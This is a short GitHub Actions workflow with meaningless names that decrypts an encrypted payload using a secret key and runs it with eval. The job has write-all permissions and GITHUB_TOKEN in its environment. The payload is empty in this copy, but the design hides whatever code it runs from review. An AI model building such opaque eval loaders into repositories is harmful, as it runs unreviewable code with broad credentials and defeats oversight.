name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload=""

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
